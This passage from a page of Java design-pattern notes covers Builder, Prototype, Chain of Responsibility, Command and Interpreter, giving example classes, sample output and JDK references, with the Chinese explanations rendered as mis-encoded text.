        <span>StringBuilder</span> sb <span>=</span> <span>new</span> <span>StringBuilder</span><span>(</span><span>)</span><span>;</span>
        <span>final</span> <span>int</span> count <span>=</span> <span>26</span><span>;</span>
        <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> count<span>;</span> i<span>++</span><span>)</span> <span>{</span>
            sb<span>.</span><span>append</span><span>(</span><span>(</span><span>char</span><span>)</span> <span>(</span><span>'a'</span> <span>+</span> i<span>)</span><span>)</span><span>;</span>
        <span>}</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>sb<span>.</span><span>toString</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code>abcdefghijklmnopqrstuvwxyz
</code></pre></div><h3 id="jdk-3" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/StringBuilder.html" target="_blank" rel="noopener noreferrer">java.lang.StringBuilder</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/nio/ByteBuffer.html#put-byte-" target="_blank" rel="noopener noreferrer">java.nio.ByteBuffer</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/StringBuffer.html#append-boolean-" target="_blank" rel="noopener noreferrer">java.lang.StringBuffer</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Appendable.html" target="_blank" rel="noopener noreferrer">java.lang.Appendable</a></li>
<li><a href="https://github.com/apache/camel/tree/0e195428ee04531be27a0b659005e3aa8d159d23/camel-core/src/main/java/org/apache/camel/builder" target="_blank" rel="noopener noreferrer">Apache Camel builders</a></li>
</ul>
<h2 id="_6-åŸå‹æ¨¡å¼-prototype" tabindex="-1"> 6. åŸå‹æ¨¡å¼ï¼ˆPrototypeï¼‰</h2>
<h3 id="intent-5" tabindex="-1"> Intent</h3>
<p>ä½¿ç”¨åŸå‹å®ä¾‹æŒ‡å®šè¦åˆ›å»ºå¯¹è±¡çš„ç±»å‹ï¼Œé€šè¿‡å¤åˆ¶è¿™ä¸ªåŸå‹æ¥åˆ›å»ºæ–°å¯¹è±¡ã€‚</p>
<h3 id="class-diagram-5" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b8922f8c-95e6-4187-be85-572a509afb71.png"/> </div><br>
<h3 id="implementation-5" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Prototype</span> <span>{</span>
    <span>abstract</span> <span>Prototype</span> <span>myClone</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcretePrototype</span> <span>extends</span> <span>Prototype</span> <span>{</span>

    <span>private</span> <span>String</span> filed<span>;</span>

    <span>public</span> <span>ConcretePrototype</span><span>(</span><span>String</span> filed<span>)</span> <span>{</span>
        <span>this</span><span>.</span>filed <span>=</span> filed<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>Prototype</span> <span>myClone</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>new</span> <span>ConcretePrototype</span><span>(</span>filed<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>String</span> <span>toString</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> filed<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Prototype</span> prototype <span>=</span> <span>new</span> <span>ConcretePrototype</span><span>(</span><span>"abc"</span><span>)</span><span>;</span>
        <span>Prototype</span> clone <span>=</span> prototype<span>.</span><span>myClone</span><span>(</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>clone<span>.</span><span>toString</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code>abc
</code></pre></div><h3 id="jdk-4" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Object.html#clone%28%29" target="_blank" rel="noopener noreferrer">java.lang.Object#clone()</a></li>
</ul>
<h1 id="ä¸‰ã€è¡Œä¸ºå‹" tabindex="-1"> ä¸‰ã€è¡Œä¸ºå‹</h1>
<h2 id="_1-è´£ä»»é“¾-chain-of-responsibility" tabindex="-1"> 1. è´£ä»»é“¾ï¼ˆChain Of Responsibilityï¼‰</h2>
<h3 id="intent-6" tabindex="-1"> Intent</h3>
<p>ä½¿å¤šä¸ªå¯¹è±¡éƒ½æœ‰æœºä¼šå¤„ç†è¯·æ±‚ï¼Œä»è€Œé¿å…è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…ä¹‹é—´çš„è€¦åˆå…³ç³»ã€‚å°†è¿™äº›å¯¹è±¡è¿æˆä¸€æ¡é“¾ï¼Œå¹¶æ²¿ç€è¿™æ¡é“¾å‘é€è¯¥è¯·æ±‚ï¼Œç›´åˆ°æœ‰ä¸€ä¸ªå¯¹è±¡å¤„ç†å®ƒä¸ºæ­¢ã€‚</p>
<h3 id="class-diagram-6" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Handlerï¼šå®šä¹‰å¤„ç†è¯·æ±‚çš„æ¥å£ï¼Œå¹¶ä¸”å®ç°åç»§é“¾ï¼ˆsuccessorï¼‰</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ca9f23bf-55a4-47b2-9534-a28e35397988.png"/> </div><br>
<h3 id="implementation-6" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Handler</span> <span>{</span>

    <span>protected</span> <span>Handler</span> successor<span>;</span>


    <span>public</span> <span>Handler</span><span>(</span><span>Handler</span> successor<span>)</span> <span>{</span>
        <span>this</span><span>.</span>successor <span>=</span> successor<span>;</span>
    <span>}</span>


    <span>protected</span> <span>abstract</span> <span>void</span> <span>handleRequest</span><span>(</span><span>Request</span> request<span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteHandler1</span> <span>extends</span> <span>Handler</span> <span>{</span>

    <span>public</span> <span>ConcreteHandler1</span><span>(</span><span>Handler</span> successor<span>)</span> <span>{</span>
        <span>super</span><span>(</span>successor<span>)</span><span>;</span>
    <span>}</span>


    <span>@Override</span>
    <span>protected</span> <span>void</span> <span>handleRequest</span><span>(</span><span>Request</span> request<span>)</span> <span>{</span>
        <span>if</span> <span>(</span>request<span>.</span><span>getType</span><span>(</span><span>)</span> <span>==</span> <span>RequestType</span><span>.</span>TYPE1<span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>request<span>.</span><span>getName</span><span>(</span><span>)</span> <span>+</span> <span>" is handle by ConcreteHandler1"</span><span>)</span><span>;</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span>successor <span>!=</span> <span>null</span><span>)</span> <span>{</span>
            successor<span>.</span><span>handleRequest</span><span>(</span>request<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteHandler2</span> <span>extends</span> <span>Handler</span> <span>{</span>

    <span>public</span> <span>ConcreteHandler2</span><span>(</span><span>Handler</span> successor<span>)</span> <span>{</span>
        <span>super</span><span>(</span>successor<span>)</span><span>;</span>
    <span>}</span>


    <span>@Override</span>
    <span>protected</span> <span>void</span> <span>handleRequest</span><span>(</span><span>Request</span> request<span>)</span> <span>{</span>
        <span>if</span> <span>(</span>request<span>.</span><span>getType</span><span>(</span><span>)</span> <span>==</span> <span>RequestType</span><span>.</span>TYPE2<span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>request<span>.</span><span>getName</span><span>(</span><span>)</span> <span>+</span> <span>" is handle by ConcreteHandler2"</span><span>)</span><span>;</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span>successor <span>!=</span> <span>null</span><span>)</span> <span>{</span>
            successor<span>.</span><span>handleRequest</span><span>(</span>request<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Request</span> <span>{</span>

    <span>private</span> <span>RequestType</span> type<span>;</span>
    <span>private</span> <span>String</span> name<span>;</span>


    <span>public</span> <span>Request</span><span>(</span><span>RequestType</span> type<span>,</span> <span>String</span> name<span>)</span> <span>{</span>
        <span>this</span><span>.</span>type <span>=</span> type<span>;</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>


    <span>public</span> <span>RequestType</span> <span>getType</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> type<span>;</span>
    <span>}</span>


    <span>public</span> <span>String</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> name<span>;</span>
    <span>}</span>
<span>}</span>

</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><div><pre><code><span>public</span> <span>enum</span> <span>RequestType</span> <span>{</span>
    TYPE1<span>,</span> TYPE2
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>

        <span>Handler</span> handler1 <span>=</span> <span>new</span> <span>ConcreteHandler1</span><span>(</span><span>null</span><span>)</span><span>;</span>
        <span>Handler</span> handler2 <span>=</span> <span>new</span> <span>ConcreteHandler2</span><span>(</span>handler1<span>)</span><span>;</span>

        <span>Request</span> request1 <span>=</span> <span>new</span> <span>Request</span><span>(</span><span>RequestType</span><span>.</span>TYPE1<span>,</span> <span>"request1"</span><span>)</span><span>;</span>
        handler2<span>.</span><span>handleRequest</span><span>(</span>request1<span>)</span><span>;</span>

        <span>Request</span> request2 <span>=</span> <span>new</span> <span>Request</span><span>(</span><span>RequestType</span><span>.</span>TYPE2<span>,</span> <span>"request2"</span><span>)</span><span>;</span>
        handler2<span>.</span><span>handleRequest</span><span>(</span>request2<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><pre><code>request1 is handle by ConcreteHandler1
request2 is handle by ConcreteHandler2
</code></pre></div><h3 id="jdk-5" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/logging/Logger.html#log%28java.util.logging.Level,%20java.lang.String%29" target="_blank" rel="noopener noreferrer">java.util.logging.Logger#log()</a></li>
<li><a href="https://commons.apache.org/proper/commons-chain/index.html" target="_blank" rel="noopener noreferrer">Apache Commons Chain</a></li>
<li><a href="http://docs.oracle.com/javaee/7/api/javax/servlet/Filter.html#doFilter-javax.servlet.ServletRequest-javax.servlet.ServletResponse-javax.servlet.FilterChain-" target="_blank" rel="noopener noreferrer">javax.servlet.Filter#doFilter()</a></li>
</ul>
<h2 id="_2-å‘½ä»¤-command" tabindex="-1"> 2. å‘½ä»¤ï¼ˆCommandï¼‰</h2>
<h3 id="intent-7" tabindex="-1"> Intent</h3>
<p>å°†å‘½ä»¤å°è£…æˆå¯¹è±¡ä¸­ï¼Œå…·æœ‰ä»¥ä¸‹ä½œç”¨ï¼š</p>
<ul>
<li>ä½¿ç”¨å‘½ä»¤æ¥å‚æ•°åŒ–å…¶å®ƒå¯¹è±¡</li>
<li>å°†å‘½ä»¤æ”¾å…¥é˜Ÿåˆ—ä¸­è¿›è¡Œæ’é˜Ÿ</li>
<li>å°†å‘½ä»¤çš„æ“ä½œè®°å½•åˆ°æ—¥å¿—ä¸­</li>
<li>æ”¯æŒå¯æ’¤é”€çš„æ“ä½œ</li>
</ul>
<h3 id="class-diagram-7" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Commandï¼šå‘½ä»¤</li>
<li>Receiverï¼šå‘½ä»¤æ¥æ”¶è€…ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤çœŸæ­£çš„æ‰§è¡Œè€…</li>
<li>Invokerï¼šé€šè¿‡å®ƒæ¥è°ƒç”¨å‘½ä»¤</li>
<li>Clientï¼šå¯ä»¥è®¾ç½®å‘½ä»¤ä¸å‘½ä»¤çš„æ¥æ”¶è€…</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c44a0342-f405-4f17-b750-e27cf4aadde2.png"/> </div><br>
<h3 id="implementation-7" tabindex="-1"> Implementation</h3>
<p>è®¾è®¡ä¸€ä¸ªé¥æ§å™¨ï¼Œå¯ä»¥æ§åˆ¶ç”µç¯å¼€å…³ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e6bded8e-41a0-489a-88a6-638e88ab7666.jpg"/> </div><br>
<div><pre><code><span>public</span> <span>interface</span> <span>Command</span> <span>{</span>
    <span>void</span> <span>execute</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>LightOnCommand</span> <span>implements</span> <span>Command</span> <span>{</span>
    <span>Light</span> light<span>;</span>

    <span>public</span> <span>LightOnCommand</span><span>(</span><span>Light</span> light<span>)</span> <span>{</span>
        <span>this</span><span>.</span>light <span>=</span> light<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>execute</span><span>(</span><span>)</span> <span>{</span>
        light<span>.</span><span>on</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>LightOffCommand</span> <span>implements</span> <span>Command</span> <span>{</span>
    <span>Light</span> light<span>;</span>

    <span>public</span> <span>LightOffCommand</span><span>(</span><span>Light</span> light<span>)</span> <span>{</span>
        <span>this</span><span>.</span>light <span>=</span> light<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>execute</span><span>(</span><span>)</span> <span>{</span>
        light<span>.</span><span>off</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Light</span> <span>{</span>

    <span>public</span> <span>void</span> <span>on</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Light is on!"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>off</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Light is off!"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code><span>/**
 * é¥æ§å™¨
 */</span>
<span>public</span> <span>class</span> <span>Invoker</span> <span>{</span>
    <span>private</span> <span>Command</span><span>[</span><span>]</span> onCommands<span>;</span>
    <span>private</span> <span>Command</span><span>[</span><span>]</span> offCommands<span>;</span>
    <span>private</span> <span>final</span> <span>int</span> slotNum <span>=</span> <span>7</span><span>;</span>

    <span>public</span> <span>Invoker</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>onCommands <span>=</span> <span>new</span> <span>Command</span><span>[</span>slotNum<span>]</span><span>;</span>
        <span>this</span><span>.</span>offCommands <span>=</span> <span>new</span> <span>Command</span><span>[</span>slotNum<span>]</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setOnCommand</span><span>(</span><span>Command</span> command<span>,</span> <span>int</span> slot<span>)</span> <span>{</span>
        onCommands<span>[</span>slot<span>]</span> <span>=</span> command<span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setOffCommand</span><span>(</span><span>Command</span> command<span>,</span> <span>int</span> slot<span>)</span> <span>{</span>
        offCommands<span>[</span>slot<span>]</span> <span>=</span> command<span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>onButtonWasPushed</span><span>(</span><span>int</span> slot<span>)</span> <span>{</span>
        onCommands<span>[</span>slot<span>]</span><span>.</span><span>execute</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>offButtonWasPushed</span><span>(</span><span>int</span> slot<span>)</span> <span>{</span>
        offCommands<span>[</span>slot<span>]</span><span>.</span><span>execute</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Invoker</span> invoker <span>=</span> <span>new</span> <span>Invoker</span><span>(</span><span>)</span><span>;</span>
        <span>Light</span> light <span>=</span> <span>new</span> <span>Light</span><span>(</span><span>)</span><span>;</span>
        <span>Command</span> lightOnCommand <span>=</span> <span>new</span> <span>LightOnCommand</span><span>(</span>light<span>)</span><span>;</span>
        <span>Command</span> lightOffCommand <span>=</span> <span>new</span> <span>LightOffCommand</span><span>(</span>light<span>)</span><span>;</span>
        invoker<span>.</span><span>setOnCommand</span><span>(</span>lightOnCommand<span>,</span> <span>0</span><span>)</span><span>;</span>
        invoker<span>.</span><span>setOffCommand</span><span>(</span>lightOffCommand<span>,</span> <span>0</span><span>)</span><span>;</span>
        invoker<span>.</span><span>onButtonWasPushed</span><span>(</span><span>0</span><span>)</span><span>;</span>
        invoker<span>.</span><span>offButtonWasPushed</span><span>(</span><span>0</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h3 id="jdk-6" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Runnable.html" target="_blank" rel="noopener noreferrer">java.lang.Runnable</a></li>
<li><a href="https://github.com/Netflix/Hystrix/wiki" target="_blank" rel="noopener noreferrer">Netflix Hystrix</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/javax/swing/Action.html" target="_blank" rel="noopener noreferrer">javax.swing.Action</a></li>
</ul>
<h2 id="_3-è§£é‡Šå™¨-interpreter" tabindex="-1"> 3. è§£é‡Šå™¨ï¼ˆInterpreterï¼‰</h2>
<h3 id="intent-8" tabindex="-1"> Intent</h3>
<p>ä¸ºè¯­è¨€åˆ›å»ºè§£é‡Šå™¨ï¼Œé€šå¸¸ç”±è¯­è¨€çš„è¯­æ³•å’Œè¯­æ³•åˆ†ææ¥å®šä¹‰ã€‚</p>
<h3 id="class-diagram-8" tabindex="-1"> Class Diagram</h3>
<ul>
<li>TerminalExpressionï¼šç»ˆç»“ç¬¦è¡¨è¾¾å¼ï¼Œæ¯ä¸ªç»ˆç»“ç¬¦éƒ½éœ€è¦ä¸€ä¸ª TerminalExpressionã€‚</li>
<li>Contextï¼šä¸Šä¸‹æ–‡ï¼ŒåŒ…å«è§£é‡Šå™¨ä¹‹å¤–çš„ä¸€äº›å…¨å±€ä¿¡æ¯ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2b125bcd-1b36-43be-9b78-d90b076be549.png"/> </div><br>
<h3 id="implementation-8" tabindex="-1"> Implementation</h3>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªè§„åˆ™æ£€éªŒå™¨å®ç°ï¼Œå…·æœ‰ and å’Œ or è§„åˆ™ï¼Œé€šè¿‡è§„åˆ™å¯ä»¥æ„å»ºä¸€é¢—è§£ææ ‘ï¼Œç”¨æ¥æ£€éªŒä¸€ä¸ªæ–‡æœ¬æ˜¯å¦æ»¡è¶³è§£ææ ‘å®šä¹‰çš„è§„åˆ™ã€‚</p>
<p>ä¾‹å¦‚ä¸€é¢—è§£ææ ‘ä¸º D And (A Or (B C))ï¼Œæ–‡æœ¬ &quot;D A&quot; æ»¡è¶³è¯¥è§£ææ ‘å®šä¹‰çš„è§„åˆ™ã€‚</p>
<p>è¿™é‡Œçš„ Context æŒ‡çš„æ˜¯ Stringã€‚</p>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Expression</span> <span>{</span>
    <span>public</span> <span>abstract</span> <span>boolean</span> <span>interpret</span><span>(</span><span>String</span> str<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>TerminalExpression</span> <span>extends</span> <span>Expression</span> <span>{</span>

    <span>private</span> <span>String</span> literal <span>=</span> <span>null</span><span>;</span>

    <span>public</span> <span>TerminalExpression</span><span>(</span><span>String</span> str<span>)</span> <span>{</span>
        literal <span>=</span> str<span>;</span>
    <span>}</span>

    <span>public</span> <span>boolean</span> <span>interpret</span><span>(</span><span>String</span> str<span>)</span> <span>{</span>
        <span>StringTokenizer</span> st <span>=</span> <span>new</span> <span>StringTokenizer</span><span>(</span>str<span>)</span><span>;</span>
        <span>while</span> <span>(</span>st<span>.</span><span>hasMoreTokens</span><span>(</span><span>)</span><span>)</span> <span>{</span>
            <span>String</span> test <span>=</span> st<span>.</span><span>nextToken</span><span>(</span><span>)</span><span>;</span>
            <span>if</span> <span>(</span>test<span>.</span><span>equals</span><span>(</span>literal<span>)</span><span>)</span> <span>{</span>
                <span>return</span> <span>true</span><span>;</span>
            <span>}</span>
        <span>}</span>
        <span>return</span> <span>false</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>AndExpression</span> <span>extends</span> <span>Expression</span> <span>{</span>

    <span>private</span> <span>Expression</span> expression1 <span>=</span> <span>null</span><span>;</span>
    <span>private</span> <span>Expression</span> expression2 <span>=</span> <span>null</span><span>;</span>

    <span>public</span> <span>AndExpression</span><span>(</span><span>Expression</span> expression1<span>,</span> <span>Expression</span> expression2<span>)</span> <span>{</span>
        <span>this</span><span>.</span>expression1 <span>=</span> expression1<span>;</span>
        <span>this</span><span>.</span>expression2 <span>=</span> expression2<span>;</span>
    <span>}</span>

    <span>public</span> <span>boolean</span> <span>interpret</span><span>(</span><span>String</span> str<span>)</span> <span>{</span>
        <span>return</span> expression1<span>.</span><span>interpret</span><span>(</span>str<span>)</span> <span>&amp;&amp;</span> expression2<span>.</span><span>interpret</span><span>(</span>str<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>OrExpression</span> <span>extends</span> <span>Expression</span> <span>{</span>
    <span>private</span> <span>Expression</span> expression1 <span>=</span> <span>null</span><span>;</span>
    <span>private</span> <span>Expression</span> expression2 <span>=</span> <span>null</span><span>;</span>

    <span>public</span> <span>OrExpression</span><span>(</span><span>Expression</span> expression1<span>,</span> <span>Expression</span> expression2<span>)</span> <span>{</span>
        <span>this</span><span>.</span>expression1 <span>=</span> expression1<span>;</span>
        <span>this</span><span>.</span>expression2 <span>=</span> expression2<span>;</span>
    <span>}</span>

    <span>public</span> <span>boolean</span> <span>interpret</span><span>(</span><span>String</span> str<span>)</span> <span>{</span>
        <span>return</span> expression1<span>.</span><span>interpret</span><span>(</span>str<span>)</span> <span>||</span> expression2<span>.</span><span>interpret</span><span>(</span>str<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>/**
     * æ„å»ºè§£ææ ‘
     */</span>
    <span>public</span> <span>static</span> <span>Expression</span> <span>buildInterpreterTree</span><span>(</span><span>)</span> <span>{</span>
        <span>// Literal</span>
        <span>Expression</span> terminal1 <span>=</span> <span>new</span> <span>TerminalExpression</span><span>(</span><span>"A"</span><span>)</span><span>;</span>
        <span>Expression</span> terminal2 <span>=</span> <span>new</span> <span>TerminalExpression</span><span>(</span><span>"B"</span><span>)</span><span>;</span>
        <span>Expression</span> terminal3 <span>=</span> <span>new</span> <span>TerminalExpression</span><span>(</span><span>"C"</span><span>)</span><span>;</span>
        <span>Expression</span> terminal4 <span>=</span> <span>new</span> <span>TerminalExpression</span><span>(</span><span>"D"</span><span>)</span><span>;</span>
        <span>// B C</span>
        <span>Expression</span> alternation1 <span>=</span> <span>new</span> <span>OrExpression</span><span>(</span>terminal2<span>,</span> terminal3<span>)</span><span>;</span>
        <span>// A Or (B C)</span>
        <span>Expression</span> alternation2 <span>=</span> <span>new</span> <span>OrExpression</span><span>(</span>terminal1<span>,</span> alternation1<span>)</span><span>;</span>
        <span>// D And (A Or (B C))</span>
        <span>return</span> <span>new</span> <span>AndExpression</span><span>(</span>terminal4<span>,</span> alternation2<span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Expression</span> define <span>=</span> <span>buildInterpreterTree</span><span>(</span><span>)</span><span>;</span>
        <span>String</span> context1 <span>=</span> <span>"D A"</span><span>;</span>
        <span>String</span> context2 <span>=</span> <span>"A B"</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>define<span>.</span><span>interpret</span><span>(</span>context1<span>)</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>define<span>.</span><span>interpret</span><span>(</span>context2<span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
